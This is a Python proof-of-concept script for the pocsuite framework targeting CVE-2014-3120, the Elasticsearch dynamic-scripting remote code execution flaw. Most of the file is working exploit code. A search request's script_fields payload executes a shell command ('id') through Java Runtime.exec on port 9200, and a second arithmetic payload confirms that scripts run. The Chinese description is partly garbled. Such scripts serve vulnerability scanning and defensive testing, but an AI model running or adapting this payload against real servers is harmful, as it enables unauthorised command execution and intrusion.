#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
# from pocsuite.poc import POCBase, Output
# from pocsuite.utils import register

from pocsuite.api.request import req  # 用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

# import requests
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0', 'content-type': 'application/json'}
poc_str = '''{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}'''
poc_str1 = '''
{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "50*50"
        }
    }
}
'''

def poc(url):
    a=False
    url=str(url)[7:]
    url="http://"+url+":9200/_search?pretty"
    try:
        res = req.post(url, data=poc_str, verify=False, timeout=5, headers=headers)
        #print res.status_code
        res1 = req.post(url, data=poc_str1, verify=False, timeout=10, headers=headers)
        response = res.text
        #print response
        response1 = res1.text
        if "2500" in response1 and "uid=" in response:
            a=True
    except Exception:
        response = ""
    return a


class TestPOC(POCBase):
    name = 'liunx_cve-2014-3120'
    vulID = 'CVE-2014-3120'
    author = ['weihong']
    vulType = 'RCE'
    version = '1.0'  # default version: 1.0
    references = ['']
    desc = '''
            Elasticsearch是一个流行的开源的搜索和分析引擎。
            这是一个远程命令执行漏洞利用Elasticsearch，利用Elasticsearch 1.2.0 之前版本的默认配置。
            问题出现在 REST API，在没有身份认证的情况下，搜索功能允许动态脚本执行，可用于远程该漏洞被发现在其他的原料药，这并不需要验证，在搜索功能允许动态脚本执行。攻击者可以利用它远程执行任何 Java 代码。
		   '''
    vulDate = '2014-05-15'
    createDate = '2020-03-20'
    updateDate = '2020-03-20'
    appName = 'Liunx ElasticSearch'
    appVersion = 'Liunx ElasticSearch < 1.2.0'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        aa = poc(self.url)
        if aa:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['IP'] = str(self.url)[7:] + ' Liunx_cve-2014-3120' + ' is exist!'
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)